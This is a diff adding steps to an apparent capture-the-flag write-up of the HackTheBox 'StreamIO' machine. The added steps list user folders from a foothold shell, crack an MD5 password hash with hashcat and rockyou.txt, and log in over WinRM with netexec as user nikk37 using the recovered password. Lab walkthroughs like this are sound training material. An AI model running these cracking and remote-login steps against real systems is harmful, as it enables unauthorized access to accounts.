@@ -815,6 +815,106 @@ Sabrina                                            f87d3c0d6c8fd686aacc6627f1f49
 PS C:\inetpub\streamio.htb\admin> 
 
 ```
+
+```
+PS C:\inetpub\streamio.htb\admin> dir c:\users
+dir c:\users
+
+
+    Directory: C:\users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        2/22/2022   2:48 AM                .NET v4.5                                                             
+d-----        2/22/2022   2:48 AM                .NET v4.5 Classic                                                     
+d-----        2/26/2022  10:20 AM                Administrator                                                         
+d-----         5/9/2022   5:38 PM                Martin                                                                
+d-----        2/26/2022   9:48 AM                nikk37                                                                
+d-r---        2/22/2022   1:33 AM                Public                                                                
+
+
+PS C:\inetpub\streamio.htb\admin> 
+
+```
+
+cracking hash:
+
+```
+hashcat -m 0 389d14cb8e4e9b94b137deb1caf0612a /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1469/2939 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 512 MB (1711 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com 
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 389d14cb8e4e9b94b137deb1caf0612a
+Time.Started.....: Fri Oct  2 08:58:23 2026 (3 secs)
+Time.Estimated...: Fri Oct  2 08:58:26 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  2795.4 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 7905280/14344385 (55.11%)
+Rejected.........: 0/7905280 (0.00%)
+Restore.Point....: 7903232/14344385 (55.10%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: getalife10 -> gerryberry
+Hardware.Mon.#01.: Util: 68%
+
+Started: Fri Oct  2 08:58:21 2026
+Stopped: Fri Oct  2 08:58:27 2026
+                                         
+```
+
+nikk37:get_dem_girls2@yahoo.com
+
+```
+nxc winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com' 
+WINRM       10.129.154.2    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.154.2    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
+                                                                                                               
+```
 ---
 ## User Flag
 
